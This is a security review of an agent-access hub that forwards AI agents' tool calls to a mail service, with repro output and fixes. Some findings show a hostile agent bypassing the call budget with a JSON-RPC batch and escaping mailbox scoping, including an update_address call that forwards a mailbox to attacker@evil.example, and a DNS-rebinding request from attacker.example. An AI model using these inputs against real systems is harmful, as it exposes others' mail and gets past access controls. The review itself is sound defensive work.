## Findings

### ER-1 — `idempotencyKey` does not prevent a second send after a cancel or a timeout — **high (blocking for the contract claim)**

- Evidence: `apps/desktop/src/main/hubCall.ts:279-282` keeps an answer only when `produced`; `cancelled` (`:166-169`, `:215`)
  and every `!forwarded.ok` (`:216-222`, incl. `product-unreachable` on the 60 s deadline) are `produced: false`, so
  `forget()` drops the key. The key is never sent to the product (`productForwarder.ts:117-121`: `callTool` carries only
  `name`, `arguments`, `_meta.traceparent`). Meanwhile the tool text promises the opposite —
  `hubTools.ts:85` ("If you gave up on a call (a timeout, a cancel), retry it with the SAME key: it may already have
  reached the product, and a new key would act twice"), `hubTools.ts:164`, the cancel refusal at `hubCall.ts:168`, and
  ADR-0115 amendment 19 ("Retrying can succeed after … `product-unreachable` and `cancelled` (with the same `idempotencyKey`)").
- Repro: `repro/er-idem.mjs` — real `createAgentCall`; the fake product counts executions; the agent's signal aborts 10 ms
  after the product received `send_email`:
  ```
  first: cancelled
  retry: succeeded
  times the product executed send_email: 2
  ```
- Scenario: an agent with `send_email` on `news@…` hits its own MCP client timeout (or the 60 s forward deadline fires
  while Fabric Inbox is slow). It follows the instructions and retries with the same key; the mail is sent twice. Same for
  `reply`, `forward`, `approve_rule_run`, `delete_message`, `create_address`.
- Fix: remember the key in an **uncertain** state whenever the request may have left Fabric (the forward started: `cancelled`
  after `deps.forward` was entered, `product-unreachable` from the deadline, a transport error after connect). A retry with
  that key answers a typed `outcome-unknown` (never re-sends) until the operator or the agent checks (`get_send_status`), or
  forward the key to the product as `_meta.idempotencyKey` once Fabric Inbox dedups on it. Keep "re-decide" only for
  refusals made BEFORE `deps.forward` was entered. Correct the three texts and amendment 19 in the same change. Test: the
  repro above as a node:test case, plus the deadline variant with `forwardToProduct` against a slow local MCP server.

### ER-2 — two connect attempts begun before the first lands both succeed; the first admin key is orphaned and stays valid — **medium-high**

- Evidence: `productConnect.ts:226-236` checks for a live connection only in `begin`, and allows up to three pending
  states per product (`:239`). `callback` (`:274-422`) never re-checks: a non-Reconnect state that lands after another
  attempt was recorded still appends `product.connected@1`, and migration 77's projector supersedes silently
  (`20261004000077_hub_access_at_the_door.sql:463-470`, "One live connection per product: a reconnect supersedes the
  previous one" — it does not ask whether this one WAS a reconnect). The superseded attempt was answered 200, so the
  product kept its key. Two Allows on first use each start a connect flow: `consentPresenter.ts:149-150`
  (`!request.connected`, a snapshot from request time) and `index.ts` `hubDecide` → `beginConnect`.
- Repro: `repro/er-twoconnect.mjs` (real `ProductConnector`, real HTTP callback, store mimicking the projector):
  ```
  begin 1 true | begin 2 true
  deliver key A -> 200 | deliver key B -> 200
  records: product.connected@1, product.connected@1
  live connection uses key B | connections superseded without Reconnect: [ 'A' ]
  vault slots written: 2
  ```
- Scenario: two agents (or one agent asking twice) wait for the operator on first use; the operator allows both, Fabric
  Inbox prompts twice, the operator allows both. Key A — level **admin**, the whole workspace — stays valid in Fabric
  Inbox with its secret in a vault slot no record names; nothing tells the operator; amendment 13/§4 ("connected again
  only by the operator's Reconnect", "one credential per connected product") is false at the callback. The UI shows one
  connection.
- Fix: in `callback`, for a state with `reconnect: false`, read `liveConnection` again after the vault write and refuse
  (non-2xx → the product revokes the new key) when one exists; make the projector refuse a non-reconnect
  `product.connected@1` while a connection lives (carry `reconnect` / `supersedes: <id>` in the payload and require it to
  name the live id). Also collapse duplicate `begin`s: while a state for the product is pending, a second non-Reconnect
  `begin` returns `busy` instead of opening another prompt. Test: the repro as a node:test case against the real
  projector (`run-hub-access-db`).

### ER-3 — no Host/Origin check on the hub port: a web page (DNS rebinding) or any process can lock binding credentials out — **medium**

- Evidence: `agentSurface.ts:461-489` reads the bearer without looking at `Host` or `Origin`; the MCP transport is built
  without DNS-rebinding protection (`agentSurface.ts:727`, `new StreamableHTTPServerTransport({ sessionIdGenerator:
  undefined, enableJsonResponse: true })`). Unknown bearers share ONE bucket of `budgetCalls/4` = 30 per minute, spent
  before the lookup (`:681`), and a binding the surface has not seen since start (`knownBearers` is in memory,
  `:299`) counts as unknown until its first successful lookup.
- Repro: `repro/er-surface.mjs` (real `AgentSurface` + `AccessService`, default limits):
  ```
  door call with Host: attacker.example, Origin: http://attacker.example -> 200
  flood statuses: 401,429
  legit binding right after the flood -> 429 {"error":"too many unknown credentials; try again later"}
  ```
- Scenario: Fabric restarts (update, crash). A page the operator has open in a browser rebinds its name to 127.0.0.1 and
  sends 30 random bearers a minute to `:47070`; every registered agent's binding credential is answered 429 for as long as
  the page stays open. No credential is exposed (the door and bindings still need their secrets, and the connect callback
  refuses any `Origin`), so this is availability, not disclosure — but it crosses from the web onto the hub.
- Fix: refuse (421/403) any request whose `Host` is not exactly `127.0.0.1:<port>` / `[::1]:<port>`, and any request
  carrying an `Origin`, before the bearer is read (or pass `allowedHosts` + `enableDnsRebindingProtection: true` to the
  transport and check the callback path by hand). Let a bearer that matches a live verifier bypass the unknown bucket:
  look it up in an in-memory verifier set refreshed from `access_bindings` (revocation is a journal event, so it can
  invalidate the set), so the unknown budget gates only database reads for bearers nobody holds.

### ER-4 — every `agent.call` spawns five processes on the main thread, unbounded: measured 0.34 s / 0.83 s event-loop stalls — **medium**

- Evidence: `observatoryVault.ts:111-138` re-resolves the engine on every read (`execFile project-observatory full-path`,
  `execFile /usr/bin/which`, `readFileSync` of the launcher), then `use_secret.py where`, `mkfifo`, `use_secret.py run`
  (`:147-245`) — five spawns per call, no cache and no concurrency cap; `hubCall.ts:201` calls it on every forwarded call.
- Measurement: `repro/er-loop.mjs` (real `createAgentCall` + real `createObservatoryVault` over a fake engine whose
  Python tools do nothing; product answers in 200 ms), `monitorEventLoopDelay` over the burst:
  ```
  N=5:   loop delay max   6.4 ms
  N=40:  loop delay p99  49.3 ms, max  59.7 ms
  N=120: loop delay p99 274.5 ms, max 342.4 ms   (one binding's whole per-minute budget)
  N=240: loop delay p99 667.4 ms, max 829.9 ms   (two bindings)
  ```
  Control (`repro/er-loop-control.mjs`, same path with the vault replaced by a 300 ms timer): N=120 max 6.5 ms, N=240
  max 6.3 ms — the stall is the vault path (600 / 1200 child processes with their pipes; 120 bare `spawn()` calls alone
  take ~30 ms synchronous here). The real `use_secret.py` imports more than the fake, which costs the children, not the
  main thread.
- Scenario: two agents batch-read a mailbox; Fabric's main process (IPC, the session surface, PTYs, the UI's answers)
  freezes for most of a second per burst, and 240 Python processes start at once.
- Fix: resolve the engine once (cache `{tools, python}` keyed by the launcher path, re-resolve on failure); bound
  concurrent vault reads with a small semaphore (e.g. 4) whose wait honours the call's `signal`; optionally skip `where`
  on `read` now that `run --vault-only` refuses non-vault sources itself (ER-10's amendment). Test: the measurement as a
  node:test with a max-delay assertion at N=120.

### ER-5 — a JSON-RPC batch spends one budget call for any number of tool calls: the external budget is bypassed — **medium-high**

- Evidence: `agentSurface.ts:717-718` spends ONE call per HTTP request (`this.spend(key, …)`), and `doorBucket`
  (`:273-281`) keys a batch by its first element only; the MCP SDK 1.30.0 server transport accepts arrays
  (`webStandardStreamableHttp.js:500-502`, "handle batch and single messages") and runs every element. The 1 MB body cap
  (`MAX_BODY_BYTES`) admits thousands of `agent.call` messages per request.
- Repro: `repro/er-batch.mjs` (real `AgentSurface` + `hubServerFor` + `AccessService`; budget 5 calls / minute; a binding
  credential obtained through the real request → Allow → status flow):
  ```
  budget 5 calls/min; ONE request with a batch of 300 agent.call -> HTTP 200, answers 300, forwards executed 300
  door: ONE request with a batch of 300 status reads -> HTTP 200, answers 300
  ```
- Scenario: an agent (buggy or hostile) holding a binding sends one POST with 300 `agent.call`s: 300 concurrent forwards
  to Fabric Inbox with the admin key (narrowed), 1 500 vault child processes (ER-4 multiplied), all inside "5 calls per
  minute". Through the door, the same shape turns ER-7's per-request buckets back into one unbounded bucket.
- Fix: refuse a JSON-RPC array on the external path (MCP 2025-06-18 dropped batching; answer 400 `batches are not
  accepted`), or spend one budget unit per element before handing the body to the transport, and key the door bucket per
  element. The session path (`:514`, `:535`) has the same per-request counting — the same fix there. Test: the repro as a
  node:test case (one request, a batch of `budgetCalls + 1` calls → refused or 429, forwards ≤ budget).

### ER-6 — Fabric never checks that the product honours `X-Fabric-Accounts`; against a Fabric Inbox server before 0.9.0 the narrowing is void and one mailbox's grant reads every mailbox — **medium-high**

- Evidence (Fabric): `productForwarder.ts:64-68` sends the header and trusts it; nothing in `productConnect.ts` (delivery
  check `:344-361`) or `hubCall.ts` asks whether the server applies it. Fabric's own first layer reads only `accountId`,
  `accounts` (an array), `hide`, `show` (`shared/access.ts:280-327`); a tool called with NO account is "covered" (no
  resource missing) and forwarded with the admin key. `repro/er-args.mjs` (real `resourceArguments` + `coverage`, grants:
  `read_message` and `update_address` on `news@`):
  ```
  read_message   {"accounts":"cloudflare:ceo@example.com"}                         -> FORWARDED narrowing=["cloudflare:news@example.com"]
  read_message   {"account":"cloudflare:ceo@example.com"}                          -> FORWARDED …
  read_message   {"AccountId":"cloudflare:ceo@example.com"}                        -> FORWARDED …
  update_address {"address":"ceo@example.com","forwardTo":"attacker@evil.example"} -> FORWARDED narrowing=["cloudflare:news@example.com"]
  ```
  With a 0.9.0 Worker these are stopped by the product (`workers/mcp/scope.ts` `scopedApi`: a path about another
  mailbox or the workspace is refused; `toolFitsScope` hides workspace tools) — the design's second layer works THERE.
- Evidence (product): the header exists only from Fabric Inbox 0.9.0 (`git grep -i x-fabric-accounts v0.8.2 -- workers`
  → nothing; `v0.9.0:workers/mcp/handler.ts:93`). The server is updated separately from the desktop app ("Fabric Inbox →
  Connect Cloudflare account… (update)", README §Deploy), and the 0.9.0 desktop app's connect flow mints through
  `POST /api/agent-keys`, which v0.8.2 already answers with `{key, clientSecret, mcpUrl}` (`v0.8.2:workers/routes/
  agent-keys.ts` → `return c.json({ key: publicKey(key), clientSecret, mcpUrl, … }, 201)`) — so a 0.9.0 app connects
  Fabric to a 0.8.x server, and Fabric accepts the delivery.
- Scenario: the operator updated the Fabric Inbox app but not the Worker. They grant an agent `list_messages` on
  `news@example.com`. The agent calls `list_messages {}`; Fabric forwards it with the **admin** key and a header the 0.8.x
  Worker ignores; the answer is "the triaged feed across every mailbox". Any tool that names a mailbox under a key
  Fabric does not read (`address`, `account`, a string `accounts`) reaches any mailbox the same way, `update_address
  forwardTo` included. The operator was shown "list and search mail in news@example.com".
- Fix: prove narrowing before the connection is recorded, and keep proving it. Fabric-only, no product change: at
  connect (inside the callback deadline, or right after as a pending check), `tools/list` once without the header and
  once with `X-Fabric-Accounts: <a syntactically valid address>`; a server that honours the header hides every workspace
  tool (`toolFitsScope`) — identical lists mean it does not, and the connection is refused (non-2xx → the product revokes
  the key) with a code that says "update your Fabric Inbox server". Better, with the product: the server echoes
  `X-Fabric-Accounts-Applied` on every answer and Fabric refuses an answer without it. Independently, fail closed in the
  first layer: for a non-workspace call that names no resource Fabric can read, forward only capabilities known to be
  mailbox-scoped, and refuse keys that look like an account (`account`, `address`, `email`, `mailbox`, a string
  `accounts`) unless they normalise to a granted resource. Test: a fake product that ignores the header → connect refused;
  `list_messages {}` never forwarded unnarrowed.

### ER-7 — prototype-named capabilities throw inside the access rules and come back as a retryable `hub-unavailable` — **low**

- Evidence: `shared/access.ts` indexes plain objects with agent input — `WORKSPACE_SETUP[capability]` (`:314`, and
  `:209-210`), `WORKSPACE_SETUP[capability.slice(0, dot)]` in `setupExtra` (`:70`), `spec.extras[key]` (`:320`),
  `PLAIN[capability]` (`:180`). `constructor` matches `CAPABILITY_PATTERN`. `repro/er-proto.mjs`:
  ```
  resourceArguments("constructor", {})          -> THROWS TypeError: setup.resource is not a function
  normaliseAccessRequest caps ["constructor.x"] -> THROWS TypeError: Cannot convert undefined or null to object
  normaliseAccessRequest caps ["constructor"]   -> true      (the operator is prompted for "constructor")
  plainCapability("constructor") type           -> "function"
  create_address with a "__proto__" key         -> requires ["create_address.undefined"]  (access-required asking for an ungrantable capability)
  ```
  Each throw lands in `hubTools.ts:91-100` / `hubCall.ts:155-163` as `hub-unavailable`, which amendment 19 lists as
  retryable — an agent retries a permanently invalid call for ever. Fails closed (nothing is granted or sent).
- Fix: `Object.hasOwn` (or `Map`s) for every lookup keyed by agent input; refuse `__proto__`/`constructor`/`prototype`
  keys as `invalid-arguments`. Test: the five lines above as assertions.

### ER-8 — the grant reads are capped at the 1 000 OLDEST rows, and dead grants never leave them: a live grant can be invisible in Settings and refused by Revoke — **medium**

- Evidence: `accessStore.ts:162` (`grantsOf`) and `:165` (`liveGrants`) read `.order('decided_at', asc).limit(1000)`;
  `liveGrants` filters only `revoked_at is null`, so expired grants and the grants of bindings whose credential was never
  collected (lapsed past the claim window, `accessService.ts:334-342` — still `revoked_at null`) stay in the window for good. One Allow can write up to
  32 × 64 = 2 048 grants (`shared/access.ts:204`, `:215`; `accessService.ts:268-270`). `overview()` (`:324`, `:343`) and
  `revokeGrant` (`:285`) read `liveGrants()`; `coverage` reads `grantsOf` per binding.
- Repro: `repro/er-grantcap.mjs` (real `AccessService` over the fast-tier store with accessStore's order + limit
  mirrored): one never-collected Allow of 32 tools × 32 mailboxes, then a small agent granted `send_email` on `ceo@`:
  ```
  small-agent can use its grant (coverage reads grantsOf): send_email cloudflare:ceo@example.com
  Settings → Agent access lists small-agent with grants: []
  operator presses Revoke on that grant -> {"ok":false,"code":"not-live","reason":"that grant is not live (already revoked, or no such grant)"}
  ```
- Scenario: an agent asks broadly once and never collects; a year of normal use accumulates expired rows; either way
  the window fills. A later agent's live `send_email` grant works, is not listed, and its Revoke answers "not live". §3
  ("The grants are listed with a Revoke action") is false; the operator's only remedy is revoking the whole agent — if
  they notice. The same shape on a single binding (`grantsOf`, oldest 1 000) makes newer grants unusable (fails closed).
- Fix: filter live grants in the query (`revoked_at is null and expires_at > now`, and a join or `binding_id in` live,
  claimed-or-claimable bindings), read `liveGrants` per binding for the overview, make `revokeGrant` read the one grant
  by id (`.eq('id', grantId)`), and cap one request at what the operator can read (e.g. ≤ 200 capability × resource
  pairs). Test: the repro against `run-hub-access-db` with the real limit.

### ER-9 — a callback refused before its state is read leaves the attempt "waiting" for 10 minutes — **low**

- Evidence: `productConnect.ts:296-311` (`Origin` 403, content type 415, body 408/413/400, not JSON 400) call `fail()`,
  which writes the answer but never `settle`s; the state is not spent either. `repro/er-deadline.mjs`:
  `trickled body (7 s) -> 408 … last: "waiting"`, `text/plain -> 415 … last: "waiting"`. The product revokes its key on any
  non-2xx, but Settings → Agent access says "waiting" until the 10-minute window turns it into "no answer".
- Fix: when exactly one state of that product is pending, settle it as `failed` with a code (`invalid-delivery`) on these
  refusals; otherwise log only. Test: the two lines above asserting `failed`.

### ER-10 — the contract's pid check cannot tell Fabric from a reused pid — **info**

- Evidence: `hub.ts:18-22` and `hubTools.ts:17-18` tell an agent to send a binding credential only when hub.json's pid is
  alive "and is Fabric", but hub.json carries nothing an agent can check that with (`HubDocument`, `hub.ts:37-44`: pid and
  `startedAt`). After a crash hub.json stays (only `withdrawHub` on quit removes it, `index.ts` hub-wiring); a recycled pid
  plus a squatter on the port passes the check as written.
- Fix: publish `executable` (the app's path) beside `pid`, and say "alive, its `ps -o comm=` is that executable, and its
  start time is not after `startedAt`". No code path in Fabric is wrong; the instruction is incomplete.

### ER-11 — the product's error text reaches the agent, client id included — **info**

- Evidence: `hubCall.ts:221` returns `forwarded.message`; `productForwarder.ts:136` builds it from the SDK error, which
  embeds the product's response body (`Error POSTing to endpoint: <text>`); `scrub` removes only the client secret
  (`:57`). `repro/er-redirect.mjs`, a product that echoes headers in a 500:
  `product-error: Streamable HTTP error: Error POSTing to endpoint: upstream said: CF-Access-Client-Id=cid-123 secret=«redacted»`.
- Fix: scrub the client id too, and return a fixed sentence per code to the agent while the body goes to the operations
  log (as `product-credential-unavailable` already does).

## What is sound (reproduced, not assumed)

- **Principals are separated by server, not by checks.** A session bearer is looked up first (`agentSurface.ts:486`)
  and reaches only the session server; the door token (constant-time `sameToken`) and a binding (sha256 verifier, `revoked_at`
  re-read on every request) reach `hubServerFor` with two / four tools and no `fabric_*` session tool.
- **Consent** (`repro/er-consent.mjs`): an unregistered `agentId` is refused before any prompt; the same ask twice returns
  one request id and no second poll secret; a wrong or missing poll secret reads as `no such request`; four concurrent
  status reads after Allow hand out exactly one credential; a binding cannot ask for another agent; a first read 11 min
  after Allow gets no credential; a decision after 10 min is refused `expired`; a denial stands without a new prompt.
- **Connect callback** (`repro/er-deadline.mjs`): replay of a used state → 400; vault 9 s → 504 at 8.2 s with no record;
  record 9 s → 504, then `product.disconnected@1` and `withdrawn`; vault 5 s + record 2.5 s → 200 inside the deadline;
  trickled body → 408 at 5.2 s; any `Origin` → 403 before the body; `text/plain` → 415. Secret first, record second.
- **Redirects** (`repro/er-redirect.mjs`, a live local product): 302 on the SDK's GET stream and 307 on the POST both end
  the call `product-refused`; the capture server saw nothing; the secret is redacted from echoed errors.
- **Registry reader** (`repro/er-registry.mjs`): FIFO, symlinks to `/dev/zero` and `/dev/tty`, a symlink loop, a
  symlink to a directory and a 50 MB sparse file are each a problem with its reason, read in 5 ms in total.
  (Residual, same-user only: 20 000 small files cost 1 s of synchronous main-thread reading per refresh, and refresh runs
  on every `fabric.access.request`.)
- **hub.json / door token** (`repro/er-hubfiles.mjs`): both 0600 even when planted as symlinks (the rename replaces the
  link; the victim file is untouched); another pid cannot withdraw them.
- **Port** (`repro/er-surface.mjs`, `repro/er-presquat.mjs`): a squatter on `0.0.0.0` or `::`, before or after Fabric
  starts, never answers `127.0.0.1` or `[::1]` — Fabric's specific binds win on both.
- **Vault**: the value goes in on stdin (`put`) and comes back through a 0600 FIFO in a 0700 `mkdtemp` directory; it is in
  no argv, no log line and no journal row (`secret_ref` is refused unless it is exactly `{project, env, name}`); per-estate
  and per-connection slot names (`secretSlotFor`). Observatory missing → a refusal with its reason, never a weaker store.
- **The product's half of narrowing (Fabric Inbox 0.9.0)** is real: `narrowPrincipal` intersects the header with the key,
  `scopedApi` refuses any path about another mailbox, `toolFitsScope` hides workspace tools — when the server runs it (ER-6).
